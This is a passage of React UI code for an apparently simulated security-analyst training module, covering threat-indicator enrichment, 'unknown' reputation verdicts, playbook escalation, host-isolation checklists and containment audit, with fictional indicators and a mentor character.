        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Globe className="w-5 h-5 text-sky-400" />
                <span>Threat Indicator Enrichment &bull; Hash, IP &amp; Domain Triad</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;Validate indicator format, source, freshness, and relevance to the endpoint observation.&quot;
              </p>
            </div>
            <div className="flex items-center gap-1.5">
              {(['hash', 'ip', 'domain'] as const).map((ib) => (
                <button
                  key={ib}
                  onClick={() => {
                    sound.playClick();
                    setActiveIntelTab(ib);
                  }}
                  className={`px-3 py-1 text-xs font-mono rounded-lg border uppercase transition-all ${
                    activeIntelTab === ib
                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                      : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                  }`}
                >
                  {ib} Intel
                </button>
              ))}
            </div>
          </div>

          {/* Intel Tab Details Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className="font-bold text-white flex items-center gap-2">
                {activeIntelTab === 'hash' ? <Hash className="w-4 h-4 text-emerald-400" /> : activeIntelTab === 'ip' ? <Network className="w-4 h-4 text-amber-400" /> : <Globe className="w-4 h-4 text-rose-400" />}
                {activeIntelTab === 'hash' ? 'FILE REPUTATION: 58/72 vendors classify hash as Cobalt Strike Beacon stager' : activeIntelTab === 'ip' ? 'IP PROFILING: 198.51.100.24 (Bulletproof VPS hosting, AbuseIPDB 88%)' : 'DOMAIN INTEL: portal-auth-update.net (Newly Registered Domain: 48h old)'}
              </span>
              <p className="text-slate-300">
                Corroborating external threat feeds confirms adversarial infrastructure targeting branch endpoints.
              </p>
            </div>
            <Badge className="bg-rose-500/20 text-rose-300 border-rose-500/30 text-xs">
              HIGH CONFIDENCE INTEL 🚨
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'ind-hash-reputation' ? (
                          <Hash className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'ind-ip-reputation' ? (
                          <Network className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'ind-domain-age' ? (
                          <Globe className="w-6 h-6 text-rose-400" />
                        ) : (
                          <Award className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 14. The "Unknown" Verdict Trap (M09-U3-C1 Pillar 2)
  // ---------------------------------------------------------------------------
  if (style === 'm09-unknown-reputation-trap') {
    const nodes = unknownReputationTrapNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <AlertOctagon className="w-5 h-5 text-amber-400" />
                <span>The &quot;Unknown&quot; Verdict Trap &bull; Behavior Overrules Hash</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;A reputation service says unknown. Can you write that the file is safe? No! Unknown means zero prior data, not safe!&quot;
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setUnknownReputationMode(unknownReputationMode === 'behavior-override' ? 'safe-trap' : 'behavior-override');
              }}
              className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                unknownReputationMode === 'behavior-override'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/40 font-bold'
              }`}
            >
              {unknownReputationMode === 'behavior-override' ? 'Behavior Overrules Unknown Hash' : 'Dangerous "0 Hits = Safe" Trap'}
            </button>
          </div>

          {/* Unknown Fallacy Box */}
          <div
            className={`p-4 rounded-xl border flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs transition-all ${
              unknownReputationMode === 'behavior-override'
                ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-200'
                : 'bg-rose-950/30 border-rose-500/40 text-rose-200'
            }`}
          >
            <div className="space-y-1 text-left">
              <span className="font-bold flex items-center gap-2">
                {unknownReputationMode === 'behavior-override' ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-rose-400" />
                )}
                {unknownReputationMode === 'behavior-override'
                  ? 'LOCAL BEHAVIOR: Binary injected shellcode into LSASS and opened socket to 198.51.100.24. Hostile!'
                  : 'HAZARDOUS ERROR: VirusTotal reports 0/72 hits on newly compiled binary, analyst falsely marks "Clean".'}
              </span>
              <p className="text-slate-300">
                {unknownReputationMode === 'behavior-override'
                  ? 'Behavior always trumps reputation. Zero-day attack tools are designed to have 0 hits on day one.'
                  : 'Equating absence of reputation history with proof of safety allows targeted intrusions to succeed.'}
              </p>
            </div>
            <Badge
              className={`font-mono text-xs ${
                unknownReputationMode === 'behavior-override'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/30'
              }`}
            >
              {unknownReputationMode === 'behavior-override' ? 'BEHAVIOR OVERRULE ✓' : 'FATAL ASSUMPTION ❌'}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'unk-service-response' ? (
                          <HelpCircle className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'unk-safe-assumption-trap' ? (
                          <Ban className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'unk-behavioral-override' ? (
                          <CheckCircle2 className="w-6 h-6 text-emerald-400" />
                        ) : (
                          <Award className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 15. Playbook Boundaries & Escalation Restraint (M09-U3-C1 Pillar 3)
  // ---------------------------------------------------------------------------
  if (style === 'm09-playbook-boundary-restraint') {
    const nodes = playbookBoundaryRestraintNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <ShieldAlert className="w-5 h-5 text-amber-400" />
                <span>Playbook Boundaries &bull; Restraint Over Unilateral Action</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;Should one weak reputation hit trigger an enterprise-wide firewall block on your own authority? No! Follow the playbook.&quot;
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setEscalationGateMode(escalationGateMode === 'governed' ? 'unilateral' : 'governed');
              }}
              className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                escalationGateMode === 'governed'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/40 font-bold'
              }`}
            >
              {escalationGateMode === 'governed' ? 'Tiered Governance Gate (L1 &rarr; L2)' : 'Unilateral Overreaction Risk'}
            </button>
          </div>

          {/* Playbook Restraint Banner */}
          <div
            className={`p-4 rounded-xl border flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs transition-all ${
              escalationGateMode === 'governed'
                ? 'bg-emerald-950/30 border-emerald-500/40 text-emerald-200'
                : 'bg-rose-950/30 border-rose-500/40 text-rose-200'
            }`}
          >
            <div className="space-y-1 text-left">
              <span className="font-bold flex items-center gap-2">
                {escalationGateMode === 'governed' ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-rose-400" />
                )}
                {escalationGateMode === 'governed'
                  ? 'GOVERNED ESCALATION: L1 analyst documents verified observables; Shift Lead evaluates and approves block.'
                  : 'OVERREACTION: Unilateral block on shared Azure IP halts business email for 5,000 employees!'}
              </span>
              <p className="text-slate-300">
                {escalationGateMode === 'governed'
                  ? 'The escalation matrix protects the organization. Fast on evidence, measured on disruptive containment.'
                  : 'Self-inflicted business outages caused by unapproved blocks are worse than the suspected threat.'}
              </p>
            </div>
            <Badge
              className={`font-mono text-xs ${
                escalationGateMode === 'governed'
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
                  : 'bg-rose-500/20 text-rose-300 border-rose-500/30'
              }`}
            >
              {escalationGateMode === 'governed' ? 'SOP COMPLIANT ✓' : 'OUTAGE RISK 🚨'}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'play-weak-indicator' ? (
                          <AlertTriangle className="w-6 h-6 text-amber-400" />
                        ) : node.id === 'play-unilateral-block-risk' ? (
                          <Ban className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'play-escalation-matrix' ? (
                          <Workflow className="w-6 h-6 text-sky-400" />
                        ) : (
                          <ShieldCheck className="w-6 h-6 text-emerald-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 16. The Pre-Isolation Verification Checklist (M09-U3-C2 Pillar 1)
  // ---------------------------------------------------------------------------
  if (style === 'm09-isolation-gate-checklist') {
    const nodes = isolationGateChecklistNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    const checklistGates = [
      { step: 1, title: 'Gate 1: Target Device ID Verification', desc: 'Confirm BLR-BR-WS-04 (10.0.4.21). Never isolate domain controllers or payroll servers!' },
      { step: 2, title: 'Gate 2: Shift Lead Formal Authorization', desc: 'Present verified process tree to Shift Lead Ananya to receive signed digital consent.' },
      { step: 3, title: 'Gate 3: Operational Impact Assessment', desc: 'Isolating 1 workstation is justified to protect 400 branch endpoints from ransomware spread.' },
      { step: 4, title: 'Gate 4: Volatile Memory Dump Order', desc: 'Trigger live RAM capture simultaneously to preserve injected code before network cut.' },
    ];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <CheckCircle2 className="w-5 h-5 text-emerald-400" />
                <span>Pre-Isolation Verification Checklist &bull; The 4-Gate Protocol</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;The button you do not press casually. Confirm target, authority, impact, and required evidence steps before acting.&quot;
              </p>
            </div>
            <div className="flex items-center gap-1.5">
              {checklistGates.map((g) => (
                <button
                  key={g.step}
                  onClick={() => {
                    sound.playClick();
                    setChecklistStep(g.step);
                  }}
                  className={`px-2.5 py-1 text-xs font-mono rounded-lg border transition-all ${
                    checklistStep === g.step
                      ? 'bg-sky-500/20 text-sky-300 border-sky-500/40 font-bold'
                      : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
                  }`}
                >
                  Gate {g.step}
                </button>
              ))}
            </div>
          </div>

          {/* Active Gate Box */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-sky-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs">
            <div className="space-y-1 text-left">
              <span className="font-bold text-white flex items-center gap-2">
                <ShieldCheck className="w-4 h-4 text-emerald-400" />
                {checklistGates[checklistStep - 1].title}
              </span>
              <p className="text-slate-300">{checklistGates[checklistStep - 1].desc}</p>
            </div>
            <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-xs">
              GATE {checklistStep}/4 VERIFIED ✓
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'gate-target-verification' ? (
                          <Laptop className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'gate-shift-lead-approval' ? (
                          <UserCheck className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'gate-impact-assessment' ? (
                          <Sliders className="w-6 h-6 text-amber-400" />
                        ) : (
                          <HardDrive className="w-6 h-6 text-purple-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 17. Simulated Host Isolation Cockpit (M09-U3-C2 Pillar 2)
  // ---------------------------------------------------------------------------
  if (style === 'm09-simulated-containment') {
    const nodes = simulatedContainmentNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <Power className="w-5 h-5 text-rose-400" />
                <span>Simulated Host Isolation Cockpit &bull; One-Click Containment</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;May you practice the approved action here? Yes, in this simulation after approval. Master the muscle memory here.&quot;
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setIsIsolated(!isIsolated);
              }}
              className={`px-4 py-1.5 text-xs font-mono font-bold rounded-lg border transition-all ${
                isIsolated
                  ? 'bg-rose-500/25 border-rose-400 text-rose-300 ring-2 ring-rose-500/40 shadow-lg shadow-rose-500/20'
                  : 'bg-emerald-500/25 border-emerald-400 text-emerald-300 hover:bg-emerald-500/40'
              }`}
            >
              {isIsolated ? 'ENDPOINT ISOLATED (CLICK TO RESTORE)' : 'CLICK TO ISOLATE BLR-BR-WS-04'}
            </button>
          </div>

          {/* Containment Cockpit Display Box */}
          <div
            className={`p-4 rounded-xl border flex flex-col sm:flex-row items-center justify-between gap-4 font-mono text-xs transition-all ${
              isIsolated
                ? 'bg-rose-950/30 border-rose-500/40 text-rose-200'
                : 'bg-emerald-950/30 border-emerald-500/40 text-emerald-200'
            }`}
          >
            <div className="space-y-1 text-left">
              <span className="font-bold flex items-center gap-2">
                {isIsolated ? (
                  <ShieldAlert className="w-4 h-4 text-rose-400" />
                ) : (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                )}
                {isIsolated
                  ? 'CONTAINED STATE: Kernel firewall drops all IP traffic. Only EDR management TLS tunnel remains alive.'
                  : 'CONNECTED STATE: Full enterprise LAN access. Lateral pivot risk active over SMB port 445.'}
              </span>
              <p className="text-slate-300">
                {isIsolated
                  ? 'Malware cannot contact C2 or spread laterally. SOC can still execute live remediation shell commands.'
                  : 'Workstation communicating normally. Proceed with containment when approval criteria are met.'}
              </p>
            </div>
            <Badge
              className={`font-mono text-xs ${
                isIsolated
                  ? 'bg-rose-500/20 text-rose-300 border-rose-500/30'
                  : 'bg-emerald-500/20 text-emerald-300 border-emerald-500/30'
              }`}
            >
              {isIsolated ? 'DIGITAL QUARANTINE ACTIVE 🚨' : 'UNCONSTRAINED LAN'}
            </Badge>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'iso-connected-state' ? (
                          <Laptop className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'iso-trigger-action' ? (
                          <Power className="w-6 h-6 text-rose-400" />
                        ) : node.id === 'iso-isolated-state' ? (
                          <Lock className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Award className="w-6 h-6 text-sky-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  // ---------------------------------------------------------------------------
  // 18. Containment Verification & Audit Dossier (M09-U3-C2 Pillar 3)
  // ---------------------------------------------------------------------------
  if (style === 'm09-containment-verification-audit') {
    const nodes = containmentVerificationAuditNodes;
    const activeNode = nodes.find((n) => n.id === selectedNodeId) || nodes[0];

    return (
      <div className="min-h-[480px] sm:min-h-[520px] rounded-2xl bg-[#03091e]/95 border border-slate-800 p-4 sm:p-6 flex flex-col justify-between relative overflow-hidden shadow-2xl w-full">
        <div className="space-y-3">
          <div className="flex flex-wrap items-center justify-between gap-2 border-b border-slate-800 pb-3">
            <div>
              <h4 className="text-base sm:text-lg font-bold text-white flex items-center gap-2">
                <FileCheck className="w-5 h-5 text-emerald-400" />
                <span>Containment Verification &bull; Case #2026-881 Ananya Sign-Off</span>
              </h4>
              <p className="text-xs sm:text-sm text-slate-300">
                Ananya: &quot;Does clicking isolate prove it was isolated? No! Verify policy status, confirm network wire silence, and log the audit entry.&quot;
              </p>
            </div>
            <button
              onClick={() => {
                sound.playClick();
                setIsDossierSigned(!isDossierSigned);
              }}
              className={`px-3 py-1 text-xs font-mono rounded-lg border transition-all ${
                isDossierSigned
                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40 font-bold'
                  : 'bg-slate-900 text-slate-400 border-slate-800 hover:text-white'
              }`}
            >
              {isDossierSigned ? 'EDR Dossier Sealed: Ananya Sign-Off' : 'Click to Sign & Seal EDR Containment'}
            </button>
          </div>

          {/* Dossier Milestone Banner */}
          <div className="p-4 rounded-xl bg-slate-900/90 border border-emerald-500/30 flex flex-col sm:flex-row items-center justify-between gap-4 font-mono">
            <div className="space-y-1 text-left">
              <span className="text-xs font-bold text-white flex items-center gap-2">
                <Award className="w-4 h-4 text-emerald-400" />
                CASE #2026-881 CONTAINMENT PHASE COMPLETE &bull; READY FOR SIEM &amp; SOAR (M10)
              </span>
              <p className="text-xs text-slate-300">
                &quot;Target BLR-BR-WS-04 isolated at 14:23:00 UTC. Policy: ENFORCED verified. Meera confirms wire traffic dropped to zero.&quot;
              </p>
            </div>
            <div className="shrink-0 flex items-center gap-2">
              <Badge className="bg-emerald-500/20 text-emerald-300 border-emerald-500/30 text-xs">
                {isDossierSigned ? 'SHIFT LEAD ANANYA SIGNED & SEALED ✓' : 'AWAITING FINAL SUPERVISORY SEAL'}
              </Badge>
            </div>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3.5 pt-1">
            {nodes.map((node) => {
              const isSelected = activeNode.id === node.id;
              return (
                <div
                  key={node.id}
                  onClick={() => {
                    sound.playClick();
                    onSelectNode(node);
                  }}
                  className={`p-4 rounded-xl border transition-all cursor-pointer flex flex-col justify-between space-y-3 ${
                    isSelected
                      ? 'bg-sky-500/20 border-sky-400 ring-2 ring-sky-500/40 shadow-[0_0_20px_rgba(56,189,248,0.25)]'
                      : 'bg-slate-900/80 border-slate-800 hover:border-slate-700 hover:bg-slate-800/60'
                  }`}
                >
                  <div className="space-y-2">
                    <div className="flex items-center justify-between">
                      <span className="text-xs font-mono font-semibold text-sky-400">{node.id}</span>
                      {node.badge && (
                        <span className="px-2 py-0.5 rounded text-[11px] font-mono bg-sky-950 border border-sky-500/30 text-sky-300">
                          {node.badge}
                        </span>
                      )}
                    </div>
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-sky-500/10 border border-sky-500/30 flex items-center justify-center shrink-0">
                        {node.id === 'audit-status-check' ? (
                          <CheckCircle2 className="w-6 h-6 text-emerald-400" />
                        ) : node.id === 'audit-network-silence' ? (
                          <Network className="w-6 h-6 text-sky-400" />
                        ) : node.id === 'audit-shift-documentation' ? (
                          <FileText className="w-6 h-6 text-purple-400" />
                        ) : (
                          <Award className="w-6 h-6 text-amber-400" />
                        )}
                      </div>
                      <div>
                        <h5 className="font-bold text-sm sm:text-base text-white">{node.label}</h5>
                        <p className="text-xs text-slate-400 font-mono">{node.sub}</p>
                      </div>
                    </div>
                  </div>
                  <p className="text-xs text-slate-300 line-clamp-2">{node.description}</p>
                </div>
              );
            })}
          </div>
        </div>

        {renderInspector(activeNode)}
      </div>
    );
  }

  return null;
}
